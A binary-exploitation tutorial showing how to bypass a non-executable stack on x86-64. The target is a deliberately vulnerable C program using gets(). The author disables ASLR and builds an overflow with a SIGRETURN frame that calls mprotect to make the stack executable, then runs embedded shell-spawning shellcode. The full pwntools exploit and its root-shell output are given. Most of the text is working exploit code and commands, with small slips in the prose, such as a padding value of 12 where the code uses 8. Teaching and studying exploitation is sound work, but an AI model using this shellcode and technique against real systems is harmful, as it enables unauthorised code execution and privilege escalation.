# Exploits
## Stack buffer overflow : Shellcode injection with mprotect (bypass NX)
## Required to understand : SIGRETURN Oriented Programming, Simple shellcode injection
## Bypasses protections : NX
## Can't work with protections : ASLR, PIE
This technique is a way to run arbitrary shellcode even with non-executable stack (NX) enabled, the way we do that is that we make the stack executable again during the program runtime  
Here we will see the 64 bits version but there's an equivalent in 32 bits, you just have to make some minor changes
There's a syscall in 64 bits that is called `mprotect`, it has the id `10` (`0x0A`) and it takes 3 arguments :
- `RDI` -> `Start address`
- `RSI` -> `Length`
- `RDX` -> `Permission`  
This syscall will set permissions (`R` | `W` | `X`) for memory region, i say region here because it's not setting permissions for a memory segment, just from an address to another one  
It will set the permission `Permission` to the region from `Start address` to `Start address + Length`  
The permission system is exactly the same as the one which is used on file permissions in Unix systems, so if we want to give all permissions (`rwx`), we have to give permission `7`  
By the way when you do enable NX or when the compilator do it by default, it will call `mprotect` at the beginning of the program to set the stack to non executable, you can verify that by using `strace` with your executable  
So here is the source code for the program :
```c
#include <stdio.h>
#include <stdlib.h>

void gadgets()
{
	__asm__(
		"pop %rax\n"
		"ret\n"
		"syscall\n"
		"ret\n"
	);
}

void vuln()
{
  char buffer[64];
  gets(buffer);

  printf("Address of buffer : %p\n", buffer);
}

int main()
{
  vuln();
}
```
You can see that i've added 2 gadgets : `pop rax ; ret` and `syscall ; ret`, that's because we will use SIGRETURN Oriented Programming to setup some registers, you can do it without SROP but it's hard because you need more gadgets  
We will first disable `ASLR` :
```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Let's compile the code, we will enable `NX` and we will disable `PIE` and `Stack smashing protector`:
```
gcc <source code filename>.c -o <executable> -fno-stack-protector -m64 -no-pie -z noexecstack
```
Let's start the exploit, we will use pwntools for the sigreturn frame and we will import `struct`, i've also created a simple function `p64` to pack numbers using `struct.pack` :
```python
import struct
import pwn
pwn.context.arch = "amd64"
pwn.context.log_level = 'debug'
p = pwn.process("./vuln")

def p64(n):
	return struct.pack("Q", n)
```
Okay so the first thing i'm gonna do is that i'mma define the shellcode i want to use, i will just use one to get a shell :
```python
shellcode = b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"
shellcode += b"\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"
shellcode += b"\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"
shellcode += b"\x58\x0f\x05"
```
Then we can start the payload where there's first the overflow, in 64 bits, the padding between the buffer and the instruction pointer is `12`, i will put my shellcode at the start of the buffer and i will fill the rest of this one with NOPs :
```python
payload = shellcode
payload += b"A"*(64-len(shellcode))
payload += b"B"*(72-64)
```
You can see that in the source code it prints the address of the buffer but we will not take it now because it may vary  
Now let's take the `pop rax ; ret` gadget address using `ROPgadget` :
```
0x0000000000401136 : pop rax ; ret
```
Now let's take the `syscall ; ret` address :
```
0x0000000000401138 : syscall
```
So we will call sigreturn :
```python
payload = shellcode
payload += b"A"*(64-len(shellcode))
payload += b"B"*(72-64)
payload += p64(0x0000000000401136) # pop rax ; ret
payload += p64(15) # SYS_RT_SIGRETURN
payload += p64(0x0000000000401138) # syscall ; ret
```
So let's overwrite now the SIGRETURN frame setting `RAX` to `10 (0x0A)` which is the id for `mprotect`, `RDI` to the stack address, for `RSI` i will set a huge length so i'm sure the buffer is concerned, but you know what, let's calculate the offset between them first to see  
So i will just start the program normally to get the buffer address, it gived me `Address of buffer : 0x7fffffffde00` and let's get the stack address, i will use gdb for that :
```
gdb <executable>
# (gdb)>
break *vuln
run
info proc mappings # or vmmap if you have the peda extension
```
It gived me :
```
...
Start Addr           End Addr       Size     Offset objfile
0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
```
So the stack is loaded at `0x7ffffffde000`, let's calculate the offset between `0x7ffffffde000` and `0x7fffffffde00` => `130560` okay so it's already a big size, i will give it `9999999999` so i'm sure it's fine  
Then in `RDX` we will give `7` as permission, in `RIP` i will give it the `syscall` gadget address and i also have to get `RSP`, it's important but we're not gonna do it for now because the buffer address will change  
All seems good ! Oh wait, no, no, damn i'm stupid, it's not gonna work, `10 (0x0A)` is the character `\n` in ASCII, it's the end of line/file, if i give it this at this place, `gets` will stop copy at this place  
Crap ! Now how can we do to prevent that ? Well i have an idea ! Instead of using the syscall directely, why not using the LIBC function instead ? It don't require `RAX` to be set  
By the way arguemnts in 64 bits are not popped in the stack but are passed in registers, so it's not changing anything for us because it's what we was about to do !  
So it's the same SIGRETURN frame but we're just gonna set `RIP` to `mprotect` at libc instead of the `syscall` gadget, so let's get the `mprotect` address in LIBC using GDB :
```
gdb <executable>
# (gdb)>
break *vuln
run
x mprotect
```
It gived me :
```
0x7ffff7edac20 <mprotect>:	0x48050f0000000ab8
```
So we now that `mprotect` is at `0x7ffff7edac20`  
So now let's craft this SIGRETURN frame :
```python
frame = pwn.SigreturnFrame() # crafts a sigreturn frame
frame.rdi = 0x00007ffffffde000 # Stack address
frame.rsi = 9999999999 # size
frame.rdx = 0x7 # All permissions
frame.rip = 0x7ffff7edac20 # call mportect (ret is in mprotect)
frame.rsp = 0 # it's gonna change
```
`RSP` here is just a placeholder for the one we will set later
Then we will just concatenate the payload with this frame :
```python
payload += bytes(frame)
```
It's almost done, let's start it and let's see where does the buffer is, so let's set the last part of the exploit :
```python
file = open("payload", "wb")
file.write(payload)

print("Launch exploit ?")
pwn.pause()

p.sendline(payload)
p.interactive()
```
You can see that i've wrote the payload into the file `payload` and i paused the program just in case we have to debug with gdb using `gdb -p <pid of program>`  
So let's launch the exploit, it printed the address of the buffer :
`Address of buffer : 0x7fffffffde70`  
It changed, so now let's implement it now, in the SIGRETURN frame, i will set `RSP` to `the address of this buffer` + `the current length of the payload at this moment` + `the size of a SIGRETURN frame (248)` :
```python
frame = pwn.SigreturnFrame() # crafts a sigreturn frame
frame.rdi = 0x00007ffffffde000 # Stack address
frame.rsi = 9999999999 # size
frame.rdx = 0x7 # All permissions
frame.rip = 0x7ffff7edac20 # call mportect (ret is in mprotect)
frame.rsp = 0x7fffffffde70 + len(payload) + 248
```
Then all i have to is to do is to jmp to the buffer (at `0x7fffffffde70`) :
```python
payload += p64(0x7fffffffde70)
```
Here is the full final exploit code :
```python
import struct
import pwn
pwn.context.arch = "amd64"
pwn.context.log_level = 'debug'
p = pwn.process("<executable>")

def p64(n):
	return struct.pack("Q", n)

shellcode = b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"
shellcode += b"\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"
shellcode += b"\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"
shellcode += b"\x58\x0f\x05"

payload = shellcode
payload += b"A"*(64-len(shellcode))
payload += b"B"*(72-64)
payload += p64(0x0000000000401136) # pop rax ; ret
payload += p64(15) # SYS_RT_SIGRETURN
payload += p64(0x0000000000401138) # syscall ; ret

frame = pwn.SigreturnFrame() # crafts a sigreturn frame
frame.rdi = 0x00007ffffffde000 # Stack address
frame.rsi = 9999999999 # size
frame.rdx = 0x7 # All permissions
frame.rip = 0x7ffff7edac20 # call mportect (ret is in mprotect)
frame.rsp = 0x7fffffffde70 + len(payload) + 248

payload += bytes(frame)
payload += p64(0x7fffffffde70)
file = open("payload", "wb")
file.write(payload)

print("Launch exploit ?")
pwn.pause()

p.sendline(payload)
p.interactive()
```
Let's launch the exploit (`python3 exploit.py`) :
```bash
[+] Starting local process './vuln': pid 2831
Launch exploit ?
[*] Paused (press any to continue)
[*] Switching to interactive mode
Address of buffer : 0x7fffffffde70
$ whoami
root
$ id
uid=0(root) gid=0(root) groups=0(root),142(kaboxer)
$  
```
It worked ! Awesome !  
Thanks for reading !
